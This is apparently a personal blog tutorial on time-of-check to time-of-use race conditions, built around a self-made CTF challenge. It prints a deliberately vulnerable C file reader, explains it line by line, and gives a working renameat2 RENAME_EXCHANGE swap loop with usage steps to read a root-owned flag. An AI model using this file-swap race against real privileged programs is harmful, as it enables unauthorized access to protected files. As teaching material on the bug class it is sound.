---
layout: post
title: Winning Race Conditions
author: Saket
date:   2019-12-21 12:12:12 +0530
image: https://miro.medium.com/max/1400/1*rLkHV47bazGNdWza9kPkmQ.png
image_caption:
---

<div class="message">
Introduction to Race Condition Vulnerability and how to Exploit them.
</div>

One fine day, someone, somewhere was absorbing random knowledge from the "great internet forums" and stumbled on a CTF challenge remake.

The challenge was to read the flag from a file [duh... "capture the FLAG(CTF)"]… but here the file was owned by root user and the programs checks for the same and if it is so, then it will not read it for us.

This actually took me hours of screaming and existential crisis, and then after looking at naked code for long enough with extensive internet researches, I found the solution (or the solution found me?). Anyways, this was cool enough for me to share with you, so here we go with an article.
<!--more-->
### So what it’s all about?
`TL;DR :` If the computer program tries to check for some condition more than once, we try to change the state of the condition in between two? transfers in attempt to deceive the program into behaving in the way we
want or it’s not supposed to work.
if you want to skip, [jump to EXPLOIT](#exp) section

![Joke_Image.png](https://miro.medium.com/max/1000/1*2I7e7fdKmE9JOBmSEJHrPQ.png "It's supposed to be funny")

In technical terms,

> "A **race condition** or **race hazard** is the condition of an electronics, software, or other system where the system’s substantive behavior is dependent on the sequence or timing of other uncontrollable events. It becomes a bug when one or more of the possible behaviors is undesirable." 
> — [WikiPedia](https://en.wikipedia.org/wiki/Race_condition)

In the light of computer security,

"In software development, **time-of-check to time-of-use (TOCTOU, TOCTTOU or TOC/TOU)** is a class of software bugs caused by a race condition involving the checking of the state of a part of a system (such as a security credential) and the use of the results of that check."

— says… guess who? …. [WikiPedia](https://en.wikipedia.org/wiki/Race_condition), ofc.

Let’s try to understand this while attempting to do the challenge we got.

---

### Recreating the challenge.

Let’s first recreate the challenge in our own machine, so that we can try it while reading this article… cool? let’s go…

* We will be using Linux for all the things, ’cause Linux is Love. If you are already working on Linux just go on, you are doing great in life, if otherwise, you can use virtual machine for this tutorial and we are good.

#### Step 1:

Let’s create a file with root ownership which will create our flag. We can do this by following commands :

```bash
echo "{th1s_fl@g_i5_wh@7_w3_s33k}" > flag.txt
chown root:root flag.txt
```
![ScreenShot.png](https://miro.medium.com/max/1400/1*pzsDxvYtEwgoDFNUV7OS7Q.png "ScreenShot")



#### Step 2:

Here’s the ***C code*** of challenge binary, used to read the root flag.txt

```c
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
int main(int argc, char* argv[]){int fd;int size = 0;char buf[256];
if(argc != 2){printf("usage: %s <file>\n", argv[0]);exit(1);}
struct stat stat_data;
if(stat(argv[1],&stat_data)<0){fprintf(stderr, "Failed to stat %s: %s\n", argv[1], strerror(errno));exit(1);}
if(stat_data.st_uid == 0){fprintf(stderr, "File %s is owned by root\n", argv[1]);exit(1);}
fd = open(argv[1], O_RDONLY);
if(fd <= 0)
{fprintf(stderr, "Couldn’t open %s\n", argv[1]);exit(1);}
do {size = read(fd, buf, 256);write(1, buf, size);}while(size>0);}
```

I know ! I know ! This is some aggressively jotted down code chunk and yes, but it works and it’s just packed by removing all unnecessary spaces and indentation.

For now just copy it can paste in a *.c file and this will work.

![](https://miro.medium.com/max/1400/1*J053Ay9Fe54ll59jXGvh8Q.png)

after compiling we get the following behaviour from our program…

![](https://miro.medium.com/max/1400/1*a6dcj44480Ugl9-LmSyKLg.png)

But we want it to somehow show the contents of the file, and that’s what we will try to do, but first let’s see what the program is actually doing and what we understand from it.

### Dissection of C Code

Here’s beautified code for you,

```c
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

int main(int argc, char* argv[]) {
    int fd;
    int size = 0;
    char buf[256];

    if(argc != 2) {
        printf("usage: %s <file>\n", argv[0]);
        exit(1);
    }

    struct stat stat_data;
    if (stat(argv[1], &stat_data) < 0) {
        fprintf(stderr, "Failed to stat %s: %s\n", argv[1], strerror(errno));
        exit(1);
    }

    if(stat_data.st_uid == 0)
    {
        fprintf(stderr, "File %s is owned by root\n", argv[1]);
        exit(1);
    }

    fd = open(argv[1], O_RDONLY);
    
    if(fd <= 0)
    {
        fprintf(stderr, "Couldn't open %s\n", argv[1]);
        exit(1);
    }

    do {
        size = read(fd, buf, 256);
        write(1, buf, size);
    } while(size>0);

}
```
[View Raw on GitHub](https://gist.github.com/Saket-Upadhyay/6f1c5e15c2b454d81f7826b64ae1df2d/raw/d7c083a03cce749158726b4131d1e50ab03e615f/raceconditionchallenge.c)

Now, let’s try to understand its workings,

**Line 1 to 6** are just imports.(all hail header files)

**Line 9,10,11** declares some obvious variables.

Now we can see that we have 4 conditions before line 38 which will actually display the contents of the file. Let’s try to understand these.

**At line 13**, we have condition to check if the given arguments to the program equals "two" or not. actually that means we have to provide one file in the arguments, the other argument is just the program itself given by default. So according to this if we don’t provide a file to read this will execute

```c
printf("usage: %s <file>\n", argv[0]);
```
and then exit.

![](https://miro.medium.com/max/1400/1*5FzFVOSl4vsYHjVTd9WzDg.png)

At **line 19**, we check if the file contains valid formatted data or not, we can see in **line 18** we defined object for **stat** structure from **sys/stat.h** header. In line 19 "if" condition we just check if we are able to extract information from the supplied file or not. If not, then we execute

```c
fprintf(stderr, "Failed to stat %s: %s\n", argv[1], strerror(errno));
```
which will print error message in standard error out and then exit.

[pubs.opengroup.org/onlinepubs/007908799/xsh/sysstat.h.html](https://pubs.opengroup.org/onlinepubs/007908799/xsh/sysstat.h.html)

At line 24, we check if the file is owned by root or not by checking the uid of the file. What’s UID ? check the link below…

[UID AND GID IN LINUX](https://geek-university.com/linux/uid-user-identifier-gid-group-identifier/)

The last check is at **Line 32**, just checks if we are able to successfully open the file as read only or not. Notice that file open at Line 30? it’s there to check for that only, no big deal here.

#### Overall working :

The program takes one argument as the file we want to open and then it will check if it’s a valid file or not and then checks for root ownership, and then if not owned by root it will try to open it as read only and then if successful in that it will show the contents.

### What we need to do?

According to above information if we somehow convince the program that the file is not root we might be able to see the contents of the file, because this is the only barrier that out file has, it’s owned by root all other checks are just kind-of integrity checks.

#### Finding the race condition flaw

Now let’s see where’s the bug that we were talking about actually is…

Here we need to focus… let’s examine the flow of the program again, and we can see that it uses **argument argv\[1\]** two times in the file at significant interval.

once at Line 19 :

```C
if (stat(argv[1], &stat_data) < 0) {
```

And then in Line 30 :
```c
fd = open(argv[1], O_RDONLY);
```

Interestingly, **it check for the root ownership with the first use** and then actually opens the file to **display the contents from second usage.**

Now imagine if we are able to change the file in between two uses of the argument we might be able to tell the program that the file is not owned by root and then pass on the file owned by root to open !!

Let’s try to understand this with a diagram.

![](https://miro.medium.com/max/1400/1*rLkHV47bazGNdWza9kPkmQ.png)

<div id="exp"></div>

### The Exploit

To exploit this vulnerability, we need to quickly swap the files before the other function calls it.

After watching lots and lots of tutorials on system calls, Linux file management etc. in hopes to find any solution to this, eventually bumped into one.

Okay, so we are going to use following things in our exploit

* SYS_renameat2 [Systemcall] : [MAN7.ORG/LINUX/MAN-PAGES](http://man7.org/linux/man-pages/man2/rename.2.html)

Our idea is to swap / rename the two files so fast that we are able to pull off above described maneuver.

Here is a small C code that can help us do that :

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

Copy the C code and compile it normally with gcc, that being done, let’s understand the code :

**Line 1 to 7 are just imports**

**Line 11** has infinite While loop as while(1) is always true

**Line 12 here has a super important** "syscall()" will call the system call from C program, here it calls renameat2 system call.

We pass the two arguments as filenames we want to rapidly swap as argv\[1\] and argv\[2\]. Let’s understand other parameters:

1. **AT_FDCWD** :If pathname is relative and dirfd is the special value AT_FDCWD, then pathname is interpreted relative to the current working directory of the calling process.

2. **RENAME_EXCHANGE** — does an atomic exchange. Atomic exchange? yeah that’s new to me too … here it is

[Atomic Operation in Linx Kernel - EmbHack](http://www.embhack.com/atomic-operation-in-linux-kernel/)

### HOW TO USE THE EXPLOIT ?

Now as we have the exploit and we know how it works, let’s use it.

just create a temp. file with anything in it

```bash
echo "1" >./temp
```
Now run the exploit program with the flag and temp file as its parameters

![](https://miro.medium.com/max/1400/1*QUfK9dAuHDDBtg3RvYQitQ.png)

this will not produce any output but let it run, it is swapping the two files rapidly.

Now OPEN NEW TERMINAL and run readFlag program with flag as parameter.

![Flag.png](https://miro.medium.com/max/1400/1*MbvBeaL5aKkPsBycGRjEQw.png)

AND THERE WE HAVE IT !! our F L A G…

#### Sign-off

Phew! that was lots of information for one article, I understand … may be it’s not that simple as I intended to make it but believe me when i say this… I was just amazed and overwhelmed with the knowledge I gained on my way through it and wanted to share it asap.

Well I hope this was new to you too and you enjoyed it, if you have any suggestion or feedback, feel free to drop it in comments.

See ya all in next article, till then keep your bodies caffeinated enough!

> NOTE: here is an awesome video by LiveOverflow on the same topic and actually this is the one which inspired me to write about it. [YOUTUBE LINK](https://www.youtube.com/watch?v=5g137gsB9Wk&feature=youtu.be)

